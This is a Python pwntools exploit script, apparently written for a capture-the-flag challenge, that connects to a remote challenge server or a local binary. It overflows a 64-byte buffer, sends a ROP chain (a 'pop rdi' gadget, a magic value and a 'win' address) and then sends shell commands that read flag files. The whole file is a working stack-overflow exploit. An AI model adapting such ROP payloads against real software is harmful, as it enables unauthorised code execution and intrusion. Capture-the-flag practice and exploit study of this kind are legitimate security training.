#!/usr/bin/env python3
from pwn import *
import os

# load binary for symbols / ROP
context.binary = elf = ELF('./chall')

# Remote target
HOST = "0.cloud.chals.io"
PORT = 31984

# Choose connection: remote by default, local if env LOCAL set
if os.environ.get("LOCAL"):
    p = process(['./chall'])
    log.info("Running locally (./chall)")
else:
    p = remote(HOST, PORT)
    log.info(f"Connected to remote {HOST}:{PORT}")

# You can also enable verbose logging:
# context.log_level = 'debug'

# Gadget and addresses
POP_RDI = 0x23c5ba     # pop rdi; ret gadget (as discovered in the binary)
MAGIC_VALUE = 0xdeadbeefcafebabe
# Use symbol from the binary if available (fallback to hardcoded)
try:
    WIN_ADDRESS = elf.symbols['win']
except KeyError:
    WIN_ADDRESS = 0x23c4e0

OFFSET = 64  # offset to saved return address

# Build ROP chain
rop = ROP(elf)
# we can append raw gadgets / values directly
rop.raw(POP_RDI)
rop.raw(MAGIC_VALUE)
rop.raw(WIN_ADDRESS)

payload = b'A' * OFFSET + rop.chain()

# Interact with prompt and send payload
p.sendlineafter(b"Say something:\n", payload)

# If remote, try to get a shell and run common flag read commands
if not os.environ.get("LOCAL"):
    # small helper to try to read some common flag locations
    try:
        # hand off to interactive (best) but attempt to cat flag first
        p.sendline(b"echo '---SHELL READY---' || true")
        p.sendline(b"cat flag.txt || cat /flag || ls -la")
    except Exception:
        pass

p.interactive()
